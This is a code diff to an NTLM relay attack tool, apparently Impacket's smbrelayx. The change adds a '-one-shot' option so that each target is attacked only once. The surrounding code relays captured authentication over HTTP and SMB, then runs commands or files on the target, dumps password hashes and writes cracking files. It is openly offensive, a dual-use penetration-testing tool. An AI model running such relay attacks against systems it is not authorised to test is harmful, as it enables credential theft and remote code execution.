@@ -403,13 +403,15 @@ class SMBClient(smb.SMB):
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile,
-                     returnStatus=STATUS_SUCCESS):
+                     one_shot, returnStatus=STATUS_SUCCESS):
             self.target = target
             self.exeFile = exeFile
             self.command = command
             self.mode = mode
             self.returnStatus = returnStatus
             self.outputFile = outputFile
+            self.attacked = set()
+            self.one_shot = one_shot
 
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
@@ -423,6 +425,11 @@ class HTTPRelayServer(Thread):
             self.machineAccount = None
             self.machineHashes = None
             self.domainIp = None
+            if self.server.target in self.server.attacked and self.server.one_shot:
+                logging.info(
+                    "HTTPD: Received connection from %s, skipping %s, already attacked" % (client_address[0], self.server.target))
+                return
+
             if self.server.target is not None:
                 logging.info(
                     "HTTPD: Received connection from %s, attacking target %s" % (client_address[0], self.server.target))
@@ -518,6 +525,8 @@ class HTTPRelayServer(Thread):
 
                     clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                     clientThread.start()
+                    # Target attacked already, adding to the attacked set
+                    self.server.attacked.add(self.target)
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
@@ -537,6 +546,7 @@ class HTTPRelayServer(Thread):
         self.target = None
         self.mode = None
         self.outputFile = outputFile
+        self.one_shot = False
 
     def setTargets(self, target):
         self.target = target
@@ -551,8 +561,9 @@ class HTTPRelayServer(Thread):
         # Not implemented yet.
         pass
 
-    def setMode(self,mode):
+    def setMode(self,mode, one_shot):
         self.mode = mode
+        self.one_shot = one_shot
 
     def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
         self.machineAccount = machineAccount
@@ -562,7 +573,7 @@ class HTTPRelayServer(Thread):
     def run(self):
         logging.info("Setting up HTTP Server")
         httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode,
-                                self.outputFile)
+                                self.outputFile, self.one_shot)
         httpd.serve_forever()
 
 class SMBRelayServer(Thread):
@@ -578,6 +589,7 @@ class SMBRelayServer(Thread):
         self.exeFile = None
         self.returnStatus = STATUS_SUCCESS
         self.command = None
+        self.one_shot = False
 
         # Here we write a mini config for the server
         smbConfig = ConfigParser.ConfigParser()
@@ -618,7 +630,31 @@ class SMBRelayServer(Thread):
             smbClient = smbData[self.target]['SMBClient']
             del smbClient
             del smbData[self.target]
-        logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
+
+        # Let's check if we already attacked this host.
+        if smbData.has_key('Attacked'):
+            if self.target in smbData['Attacked'] and self.one_shot is True:
+                logging.info("SMBD: Received connection from %s, skipping %s, already attacked" % (connData['ClientIP'] ,self.target))
+                packet = smb.NewSMBPacket()
+                packet['Flags1'] = smb.SMB.FLAGS1_REPLY
+                packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS
+                packet['Command'] = recvPacket['Command']
+                packet['Pid'] = recvPacket['Pid']
+                packet['Tid'] = recvPacket['Tid']
+                packet['Mid'] = recvPacket['Mid']
+                packet['Uid'] = recvPacket['Uid']
+                packet['Data'] = '\x00\x00\x00'
+                errorCode = STATUS_NOT_SUPPORTED
+                packet['ErrorCode'] = errorCode >> 16
+                packet['ErrorClass'] = errorCode & 0xff
+
+                return None, [packet], STATUS_NOT_SUPPORTED
+            else:
+                logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
+        else:
+            smbData['Attacked'] = set()
+            logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
+
         try: 
             if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                 extSec = False
@@ -761,8 +797,11 @@ class SMBRelayServer(Thread):
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.getJTRdumpPath())
                     del (smbData[self.target])
+
                     clientThread = doAttack(smbClient,self.exeFile,self.command)
                     clientThread.start()
+                    # Target attacked already, adding to the attacked set
+                    smbData['Attacked'].add(self.target)
 
                     # Now continue with the server
                 #############################################################
@@ -834,11 +873,14 @@ class SMBRelayServer(Thread):
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                           self.server.getJTRdumpPath())
+                # Remove the target server from our connection list, the work is done
                 del (smbData[self.target])
                 clientThread = doAttack(smbClient, self.exeFile, self.command)
                 clientThread.start()
-                # Remove the target server from our connection list, the work is done
+                # Target attacked already, adding to the attacked set
+                smbData['Attacked'].add(self.target)
                 # Now continue with the server
+
 
             #############################################################
 
@@ -897,8 +939,9 @@ class SMBRelayServer(Thread):
             'logon_failure' : STATUS_LOGON_FAILURE
         }[returnStatus.lower()]
 
-    def setMode(self,mode):
+    def setMode(self,mode, one_shot):
         self.mode = mode
+        self.one_shot = one_shot
 
     def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
         self.machineAccount = machineAccount
@@ -923,6 +966,8 @@ if __name__ == '__main__':
                         help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND',
                         help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-one-shot', action='store_true', default=False,
+                        help='After successful authentication, only execute the attack once for each target (and protocol)')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
     parser.add_argument('-machine-account', action='store', required=False,
@@ -956,7 +1001,7 @@ if __name__ == '__main__':
         s.setExeFile(exeFile)
         s.setCommand(Command)
         s.setReturnStatus(returnStatus)
-        s.setMode(mode)
+        s.setMode(mode, options.one_shot)
         if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
             s.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
         elif (options.machine_account is None and options.machine_hashes is None and options.domain is None) is False:
